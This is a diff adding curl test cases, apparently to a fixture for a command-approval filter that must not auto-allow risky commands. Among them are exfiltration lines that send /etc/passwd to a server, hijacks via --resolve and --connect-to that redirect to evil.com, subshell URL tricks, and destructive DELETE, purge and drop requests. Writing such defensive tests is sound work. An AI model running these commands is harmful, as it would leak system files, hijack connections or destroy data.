@@ -187,3 +187,42 @@ gh secret delete FOO
 gh secret remove FOO
 gh variable set FOO -b value
 gh variable delete FOO
+
+# --- curl to trusted domain: should NOT match (fall through) ---
+# DELETE method — destructive, needs human confirmation
+curl -s -X DELETE "https://studio.taufinity.io/api/sites/2"
+# Unknown domain — not trusted
+curl -s -X PUT "https://evil.com/api/sites/2/settings" -d '{"key": "value"}'
+# curl to untrusted domain (google)
+curl -s "https://api.google.com/v1/resource"
+# curl with -o flag (file write)
+curl -s "https://studio.taufinity.io/api/data" -o /tmp/output.json
+# curl with --output flag
+curl -s "https://studio.taufinity.io/api/data" --output /tmp/output.json
+# curl with --upload-file (exfiltration)
+curl -s -T /etc/passwd "https://studio.taufinity.io/api/upload"
+# curl with --resolve (connection hijack)
+curl -s --resolve studio.taufinity.io:443:evil.com:443 "https://studio.taufinity.io/api/data"
+# curl with @file data reference (exfiltration)
+curl -s -X POST "https://studio.taufinity.io/api/data" -d @/etc/passwd
+# curl with --data-binary @file
+# Destructive path keyword
+curl -s -X POST "https://studio.taufinity.io/api/sites/2/destroy"
+# curl with no URL (bare curl)
+curl -s -H "Authorization: Bearer token"
+# curl bypass attempts (must NOT auto-allow)
+# Variable URL — can't verify domain
+curl -s -X PUT "$URL" -d '{"key": "value"}'
+# Subshell URL construction
+curl -s -X PUT "$(echo https://evil.com)/api" -d '{"key": "value"}'
+# Connect-to hijack
+curl --connect-to studio.taufinity.io:443:evil.com:443 "https://studio.taufinity.io/api/data"
+# Data exfil via --data=@
+curl -s -X POST "https://studio.taufinity.io/api/data" --data=@/etc/passwd
+# Upload file exfil
+# Output to sensitive path
+# DELETE disguised with -XDELETE (no space)
+curl -s -XDELETE "https://studio.taufinity.io/api/sites/2"
+# Destructive path in POST
+curl -s -X POST "https://studio.taufinity.io/api/data/purge"
+curl -s -X POST "https://studio.taufinity.io/api/database/drop"
